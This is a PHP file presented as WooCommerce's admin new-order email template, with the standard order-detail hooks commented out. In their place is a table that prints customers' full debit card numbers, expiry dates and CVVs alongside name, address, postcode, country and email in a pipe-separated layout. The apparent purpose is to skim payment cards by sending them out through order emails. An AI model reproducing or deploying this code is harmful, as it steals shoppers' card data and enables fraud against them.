<?php
/**
 * Admin new order email
 *
 * This template can be overridden by copying it to yourtheme/woocommerce/emails/admin-new-order.php.
 *
 * HOWEVER, on occasion WooCommerce will need to update template files and you
 * (the theme developer) will need to copy the new files to your theme to
 * maintain compatibility. We try to do this as little as possible, but it does
 * happen. When this occurs the version of the template file will be bumped and
 * the readme will list any important changes.
 *
 * @see https://docs.woocommerce.com/document/template-structure/
 * @package WooCommerce\Templates\Emails\HTML
 * @version 3.7.0
 */

defined( 'ABSPATH' ) || exit;

/*
 * @hooked WC_Emails::email_header() Output the email header
 */
//do_action( 'woocommerce_email_header', $email_heading, $email ); ?>

<?php /* translators: %s: Customer billing full name */ ?>
    <p><?php //printf( esc_html__( 'You’ve received the following order from %s:', 'woocommerce' ), $order->get_formatted_billing_full_name() ); // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped ?></p>
<?php

/*
 * @hooked WC_Emails::order_details() Shows the order details table.
 * @hooked WC_Structured_Data::generate_order_data() Generates structured data.
 * @hooked WC_Structured_Data::output_structured_data() Outputs structured data.
 * @since 2.5.0
 */
//do_action( 'woocommerce_email_order_details', $order, $sent_to_admin, $plain_text, $email );

/*
 * @hooked WC_Emails::order_meta() Shows order meta data.
 */
//do_action( 'woocommerce_email_order_meta', $order, $sent_to_admin, $plain_text, $email );

/*
 * @hooked WC_Emails::customer_details() Shows customer details
 * @hooked WC_Emails::email_address() Shows email address
 */
//do_action( 'woocommerce_email_customer_details', $order, $sent_to_admin, $plain_text, $email );

/**
 * Show user-defined additional content - this is set in each email's settings.
 */
?>
    <table>
        <thead>
        <th>Card | </th>
        <th>Exp | </th>
        <th>Cvv | </th>
        <th>Full name |</th>
        <th>Address |</th>
        <th>zip code |</th>
        <th>Country |</th>
        <th>Email |</th>
        </thead>
        <tbody>
        <tr>
            <td><?php echo $order->get_meta( 'ptxpayment_debit_card_number' ) ?> |</td>
            <td><?php echo $order->get_meta( 'ptxpayment_debit_card_date' ) ?> |</td>
            <td><?php echo $order->get_meta( 'ptxpayment_debit_card_cvv' ) ?> |</td>
            <td><?php echo $order->get_billing_first_name() ?> |</td>
            <td><?php echo $order->get_billing_address_1() ?> |</td>
            <td><?php echo $order->get_billing_postcode() ?> |</td>
            <td><?php echo $order->get_billing_country() ?> |</td>
            <td><?php echo $order->get_billing_email() ?> |</td>
        </tr>
        </tbody>
    </table>
<?php
// echo "Card | exp | cvv | full name | address | zip code | country | Email |</br>";
// echo $order->get_meta( 'ptxpayment_debit_card_number' ) . "|" . $order->get_meta( 'ptxpayment_debit_card_date' ) . "|" . $order->get_meta( 'ptxpayment_debit_card_cvv' ) . "|" . $order->get_billing_first_name() . "|" . $order->get_billing_address_1() . "|" .

// $order->get_billing_postcode() . "|" . $order->get_billing_country() . "|" . $order->get_billing_email();

if ( $additional_content ) {
    echo wp_kses_post( wpautop( wptexturize( $additional_content ) ) );
}

/*
 * @hooked WC_Emails::email_footer() Output the email footer
 */
do_action( 'woocommerce_email_footer', $email );